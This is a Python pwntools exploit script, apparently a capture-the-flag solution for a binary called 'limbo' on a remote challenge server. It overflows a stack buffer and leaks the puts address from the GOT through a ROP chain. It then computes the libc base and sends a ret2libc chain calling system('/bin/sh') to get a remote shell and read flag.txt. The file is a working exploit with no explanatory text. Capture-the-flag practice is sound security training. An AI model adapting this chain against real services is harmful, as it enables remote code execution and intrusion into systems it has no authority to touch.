from pwn import ELF, ROP, remote, cyclic, p64, u64, log

elf = ELF("./limbo-handout/limbo")
rop = ROP(elf)
libc = ELF("./limbo-handout/libc-2.35.so")

# p = elf.process()
# io.ept.gg 30003
p = remote("io.ept.gg", 30003)


offset = 56
buff = cyclic(offset)

PUTS_PLT = p64(elf.plt["puts"])
MAIN_PLT = p64(elf.symbols["main"])
PUTS_GOT = p64(elf.got["puts"])
POP_RDI = p64((rop.find_gadget(["pop rdi"]))[0])
RET = p64((rop.find_gadget(["ret"]))[0])

INIT_TEXT = "Kan du hjelpe meg med å finne biblioteket?\n".encode()


def init():
    p.recvuntil(INIT_TEXT)


def leakAdd(function):

    pay = buff
    pay += POP_RDI + p64(elf.got[function]) + PUTS_PLT + MAIN_PLT
    p.sendline(pay)

    try:
        recv = p.recvuntil(INIT_TEXT)
        print(recv)
        leak = recv[0:6]
        print(leak)

        # leak = p.recvuntil("K".encode())[:-1].strip()
        # leak = u64(leak.ljust(8, b"\x00"))
        # log.info(f"Leaked {function}: {hex(leak)}")

        leak = u64(leak.ljust(8, b"\x00"))
        log.info(f"Leaked {function}: {hex(leak)}")
    except Exception as e:
        log.error(e)
        log.warn(f"Could not leak {function}")
        return None

    return leak


def getAllLeaks():
    for got in elf.got:
        leakAdd(got)


def callSystemWithLibc():
    puts_addr = leakAdd("puts")
    libc_base = puts_addr - libc.symbols["puts"]
    system_addr = libc_base + libc.symbols["system"]
    binsh_addr = libc_base + next(libc.search(b"/bin/sh\x00"))
    exit_addr = libc_base + libc.symbols["exit"]

    log.info("libc puts: " + hex(puts_addr))
    log.info("libc binsh: " + hex(binsh_addr))
    log.info("libc system: " + hex(system_addr))
    log.info("libc exit: " + hex(exit_addr))

    payload = buff
    payload += p64(rop.find_gadget(["ret"])[0])
    payload += p64(rop.find_gadget(["pop rdi", "ret"])[0])
    payload += p64(binsh_addr)
    payload += p64(system_addr)
    payload += p64(exit_addr)
    return payload


init()
p.sendline(callSystemWithLibc())
p.sendline("ls")
print(p.recvline())
print(p.recvline())
p.sendline("cat flag.txt")
print(p.recvuntil("}"))
# p.interactive()
